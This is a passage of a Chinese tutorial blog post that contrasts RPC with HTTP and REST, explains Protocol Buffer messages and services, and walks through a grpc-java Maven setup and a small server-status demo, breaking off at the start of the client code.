writing the details for theremote interaction.</p></blockquote><p>而HTTP——<em>Hypertext TransferProtocol</em>超文本传输协议则于1989年由<code>Tim Berners-Lee</code>提出，第一个版本HTTP/1.0于1996年提出，现在已经到了HTTP/3.0版本（2022年），是现代互联网数据通信的基石。</p><blockquote><p>The <strong>Hypertext Transfer Protocol</strong>(<strong>HTTP</strong>) is an application layer protocol in the Internetprotocol suite model for distributed, collaborative, hypermediainformation systems.</p></blockquote><p>所以这两个协议设计之初的场景就有所区别，RPC技术（我理解RPC是技术而不是协议）是为了提供分布式计算场景下、不同实体上进程的通信所设计的技术，且要实现<strong>本地透明化调用的效果</strong>，像调用本地方法一样调用另一个机器上的方法，不对上层业务逻辑代码产生影响。</p><p>而HTTP协议是为了让客户端能能够访问WWW上的资源（文本、图像、视频）而设计的协议，并设计了大量的状态码来标识状态。因此从这个角度，<strong>HTTP协议更多用于B/S架构，而RPC更多用于C/S</strong>。</p><h2 id="restful为什么不用rpc呢">RESTful为什么不用RPC呢？</h2><p>当然，也不是说HTTP不能用于C/S。</p><p>我们回到开始我提到的例子，RESTful风格就提倡使用HTTP，那为什么不用RPC呢？这里就需要稍微了解下RESTful风格（于2000年由RoyFielding博士论文中提出）了。</p><p>RESTful——<em>Resource Representational StateTransfer(表示层状态转移)</em>之所以RESTful风格选择HTTP的原因在于，RESTful的关注点在<strong>Representational</strong>，即<strong>资源的表示</strong>，提倡将服务的资源以可读的方式表示出来，如JSON、XML等，并通过HTTP提供的方法GET、POST、PUT、DELETE执行状态，使得服务端的服务发生状态变化（<em>StateTransfer</em>）。比如SpringBoot应用中，大家可能用过HATEOAS组件，实现向客户端返回相关资源链接的效果。比如我们访问api.github.com，从相应的json中就可以得到所有的资源及其对应的链接。</p><p><img src="/img/gRPC简介与使用/image-20230705130416414.png" /></p><p><strong>单纯使用HTTP替换掉RPC技术是可行的，但是意义不大。</strong>RESTful中定义的动作（GET、POST、PUT、DELETE），HTTP的一些状态码、特别是传输的格式（JSON、XML）没有太大的意义，个人理解原因如下：</p><ul><li>服务之间的调用不需要<strong>动作</strong>的概念，只是简单的调用</li><li>HTTP大量的状态码对于分布式系统中需要考虑的三态（超时、成功、失败）来说是冗余的</li><li>进程之间传输的数据不需要<strong>可读</strong>这个属性</li></ul><p>因此，LeonardRichardson也提出了REST成熟度模型，上述提到的、单纯使用HTTP替换掉RPC的方式就属于成熟度最低的Level0，有兴趣可以进一步阅读：<ahref="https://martinfowler.com/articles/richardsonMaturityModel.html">RichardsonMaturity Model (martinfowler.com)</a></p><p><img src="/img/gRPC简介与使用/overview.png" /></p><h1 id="protocol-buffer基本概念">Protocol Buffer基本概念</h1><blockquote><p>ProtocolBuffer有两个版本v2和v3，前者是后者子集。详细概念阐述、代码例子可以参考：<ahref="https://grpc.io/docs/what-is-grpc/core-concepts/">Core concepts,architecture and lifecycle | gRPC</a>、<ahref="https://grpc.io/docs/languages/java/basics/">Basics tutorial |Java | gRPC</a></p></blockquote><p>ProtocolBuffer在谷歌内部有广泛的应用，包括不限于服务器内部通信、存档数据的存储等。</p><p>正如名字所言，protobuf中的核心就是<em>protocol</em>，即<strong>协议</strong>。个人理解，协议即是定义实体之间交互的方式方法流程，用于实现某个特定目的，<strong>就像函数一样</strong>。因此我们也可以将这个过程抽象一下，得到协议<strong>方法</strong>（<code>services</code>）和所用到的特定<strong>消息</strong>（<code>message</code>），而这两个元素也正是使用protobuf时我们需要定义的内容，通常写在文件<code>.proto</code>文件中。</p><h2 id="message">message</h2><p>一个简单的<strong>消息</strong>定义如下：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 定义一个搜索请求</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">message </span><span class="title class_">SearchRequest</span> &#123;</span><br><span class="line"><span class="type">string</span> query = <span class="number">1</span>;</span><br><span class="line"><span class="type">int32</span> page_number = <span class="number">2</span>;</span><br><span class="line"><span class="type">int32</span> results_per_page = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上我们定义了一个查询请求的<strong>消息结构</strong>，<code>syntax</code>关键字的值代表我们所使用的protobuf的版本，下面的<code>message</code>关键字开始描述了一个名为<code>SearchRequest</code>的消息的结构，包含三个属性，每个属性由类型和数值组成。这样就完成了一条消息格式的编写了。</p><p>这里需要注意，上面例子中的数值并非是<strong>默认值</strong>的含义，而是类似序号的含义，他们唯一标识了消息中的字段，官方也指出了序号的规则：</p><ul><li>对于一个message，每个字段的序号必须是独一无二的</li><li>序号<code>19000</code>~<code>19999</code>属于protobuf的保留序号</li><li>我们不能使用保留序号，且使用序号的范围是<code>1</code>~<code>536870911</code></li></ul><p>通常情况下1-15的序号就够我们用了，一则没那么多变量需要定义，二则15-2047之间就需要两个字节来记录了，会产生更大的数据包。</p><h2 id="services">services</h2><p>在定义好消息之后，我们就可以定义使用消息进行交互的协议了。假设我们定义一个协议，发送方发送一个搜索请求给接收方，接收方回复一个搜索结果，那么我们可以将该过程定义出来：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">service </span><span class="title class_">SearchService</span> &#123;</span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Search(SearchRequest) <span class="keyword">returns</span> (SearchResponse)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="工作流程">工作流程</h2><p>当我们定义好了消息和服务方法后，我们就可以使用官方提供的编译器进行编译了：<ahref="https://protobuf.dev/downloads/">Downloads | Protocol BuffersDocumentation (protobuf.dev)</a></p><p>该编译器支持输出Python、Java、C++等语言的代码，我们可以利用这些代码提供的API实现RPC调用。向pom依赖中添加如下依赖和插件，具体可见官方的<ahref="https://github.com/grpc/grpc-java/blob/master/README.md">README</a>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-netty-shaded<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.56.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-protobuf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.56.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-stub<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.56.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span> <span class="comment">&lt;!-- necessary for Java 9+ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>annotations-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.53<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">extensions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">extension</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>kr.motd.maven<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>os-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">extension</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">extensions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.xolstice.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>protobuf-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.6.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">protocArtifact</span>&gt;</span>com.google.protobuf:protoc:3.22.3:exe:$&#123;os.detected.classifier&#125;<span class="tag">&lt;/<span class="name">protocArtifact</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pluginId</span>&gt;</span>grpc-java<span class="tag">&lt;/<span class="name">pluginId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pluginArtifact</span>&gt;</span>io.grpc:protoc-gen-grpc-java:1.56.0:exe:$&#123;os.detected.classifier&#125;<span class="tag">&lt;/<span class="name">pluginArtifact</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>compile-custom<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果是idea，可以在右侧的mvn中看到protobuf的插件：</p><p><img src="/img/gRPC简介与使用/image-20230705112745589.png" style="zoom:67%;" /></p><p>这样在maven进行compile时就会自动生成代码了。</p><h1 id="一个demo">一个Demo</h1><p>下面写一个简单的Demo，首先定义消息和协议方法，实现查看我一个小板子的一些状态信息。定义枚举、消息、协议如下：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> status;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定输出的目录名称</span></span><br><span class="line"><span class="keyword">option</span> java_package = <span class="string">&quot;TinyServer&quot;</span>;</span><br><span class="line"><span class="comment">// 指定输出的Java类的名称</span></span><br><span class="line"><span class="keyword">option</span> java_outer_classname = <span class="string">&quot;StatusServiceProtos&quot;</span>;</span><br><span class="line"><span class="comment">// 输出多个Java包装类</span></span><br><span class="line"><span class="keyword">option</span> java_multiple_files = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum </span><span class="title class_">StatusOptions</span> &#123;</span><br><span class="line">  CPU_USAGE = <span class="number">0</span>;  <span class="comment">// 查看CPU使用率</span></span><br><span class="line">  MEM_USAGE = <span class="number">1</span>;  <span class="comment">// 查看内存使用量</span></span><br><span class="line">  KERNEL = <span class="number">2</span>;     <span class="comment">// 查看操作系统分支</span></span><br><span class="line">  TIME = <span class="number">3</span>;       <span class="comment">// 查看系统时间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">StatusRequest</span> &#123;</span><br><span class="line">  <span class="keyword">optional</span> <span class="type">int32</span> requestOpt = <span class="number">1</span>;  <span class="comment">// 请求操作数，即上面StatusOptions中定义的</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">StatusResponse</span> &#123;</span><br><span class="line">  <span class="keyword">optional</span> <span class="type">string</span> statusReport = <span class="number">1</span>;  <span class="comment">// 返回数据</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">service </span><span class="title class_">ServerStatus</span> &#123;</span><br><span class="line">  <span class="comment">// 服务器状态查询</span></span><br><span class="line">  <span class="comment">// 给定查询状态的指标，返回状态值</span></span><br><span class="line">  <span class="function"><span class="keyword">rpc</span> QueryIndex(StatusRequest) <span class="keyword">returns</span>(StatusResponse) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用mavencompile对项目进行编译，在target目录下我们可以得到这protobuf为我们生成的代码：</p><p><img src="/img/gRPC简介与使用/image-20230705104947828.png" style="zoom:80%;" /></p><p>在这个生成的<code>xxxGrpc</code>的类中包含了我们服务端和客户端代码需要依赖的类：</p><p><img src="/img/gRPC简介与使用/image-20230705105125851.png" alt="image-20230705105125851" style="zoom:67%;" /></p><p>其中<code>xxxImplBase</code>是我们服务端，编写服务时需要继承并覆写方法的类；而<code>xxxStub</code>则是客户端与服务端沟通使用的类，又分为三种：</p><ul><li>xxxStub：异步IO模式</li><li>xxxBlockingStub：即同步的，等待服务器响应期间保持阻塞状态</li><li>xxxFutureStub：既可以当异步也可以当同步，Future机制</li></ul><h2 id="服务端">服务端</h2><p>下面我们编写服务端代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io.grpc.Grpc;</span><br><span class="line"><span class="keyword">import</span> io.grpc.InsecureServerCredentials;</span><br><span class="line"><span class="keyword">import</span> io.grpc.Server;</span><br><span class="line"><span class="keyword">import</span> io.grpc.stub.StreamObserver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"><span class="keyword">import</span> java.lang.management.ManagementFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.management.OperatingSystemMXBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> TinyServer.ServerStatusGrpc;</span><br><span class="line"><span class="keyword">import</span> TinyServer.StatusOptions;</span><br><span class="line"><span class="keyword">import</span> TinyServer.StatusRequest;</span><br><span class="line"><span class="keyword">import</span> TinyServer.StatusResponse;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 查看服务器远程状态包括CPU占用率、可用内存、os分支、系统时间</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> float311@163.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/7/3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TinyStatusServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> Logger.getLogger(TinyStatusServer.class.getName());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String port;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Server server;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TinyStatusServer</span><span class="params">(String port)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.port = port;</span><br><span class="line">        <span class="built_in">this</span>.server = Grpc.newServerBuilderForPort(Integer.parseInt(port), InsecureServerCredentials.create())</span><br><span class="line">                .addService(<span class="keyword">new</span> <span class="title class_">StatusServiceImpl</span>())</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startServer</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            server.start();</span><br><span class="line">            logger.info(<span class="string">&quot;状态服务启动成功！监听端口：&quot;</span> + port);</span><br><span class="line">            Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                System.err.println(<span class="string">&quot;*** JVM已停止&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    TinyStatusServer.<span class="built_in">this</span>.stopServer();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                System.err.println(<span class="string">&quot;*** 服务关闭&quot;</span>);</span><br><span class="line">            &#125;));</span><br><span class="line">            server.awaitTermination();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;端口已被占用！&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stopServer</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">if</span> (server != <span class="literal">null</span>) &#123;</span><br><span class="line">            server.shutdown().awaitTermination(<span class="number">5</span>, TimeUnit.SECONDS);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StatusServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">ServerStatusGrpc</span>.ServerStatusImplBase &#123;</span><br><span class="line">        <span class="keyword">private</span> StatusResponse <span class="title function_">getResult</span><span class="params">(StatusRequest request)</span> &#123;</span><br><span class="line">            <span class="type">OperatingSystemMXBean</span> <span class="variable">operatingSystemMXBean</span> <span class="operator">=</span> (OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean();</span><br><span class="line">            String result;</span><br><span class="line">            <span class="keyword">switch</span> (request.getRequestOpt()) &#123;</span><br><span class="line">                <span class="keyword">case</span> StatusOptions.CPU_USAGE_VALUE:</span><br><span class="line">                    result = String.valueOf(operatingSystemMXBean.getSystemLoadAverage());</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> StatusOptions.MEM_USAGE_VALUE:</span><br><span class="line">                    result = (operatingSystemMXBean.getTotalPhysicalMemorySize()</span><br><span class="line">                            - operatingSystemMXBean.getFreePhysicalMemorySize()) / (<span class="number">1024</span> * <span class="number">1024</span>) + <span class="string">&quot;MB&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> StatusOptions.KERNEL_VALUE:</span><br><span class="line">                    result = operatingSystemMXBean.getArch();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> StatusOptions.TIME_VALUE:</span><br><span class="line">                    <span class="type">SimpleDateFormat</span> <span class="variable">format</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">                    ;</span><br><span class="line">                    result = format.format(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    result = <span class="string">&quot;未知的操作数！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> StatusResponse.newBuilder()</span><br><span class="line">                    .setStatusReport(result)</span><br><span class="line">                    .build();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">queryIndex</span><span class="params">(StatusRequest request, StreamObserver&lt;StatusResponse&gt; responseObserver)</span> &#123;</span><br><span class="line">            responseObserver.onNext(getResult(request));</span><br><span class="line">            responseObserver.onCompleted();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">TinyStatusServer</span> <span class="variable">statusServer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TinyStatusServer</span>(args[<span class="number">0</span>]);</span><br><span class="line">        statusServer.startServer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="客户端">客户端</h2><p>对应的客户端代码如下，我们使用的阻塞的stub：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> TinyServer.ServerStatusGrpc;</span><br><span class="line"><span class="keyword">import</span> TinyServer.ServerStatusGrpc.ServerStatusBlockingStub;</span><br><span class="line"><span class="keyword">import</span> TinyServer.StatusRequest;</span><br><span class="line"><span class="keyword">import</span> TinyServer.StatusResponse;</span><br><span class="line"><span class="keyword">import</span> io.grpc.Grpc;</span><br><span class="line"><span class="keyword">import</span> io.grpc.InsecureChannelCredentials;</span><br><span class="line"><span class="keyword">import</span> io.grpc.ManagedChannel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span 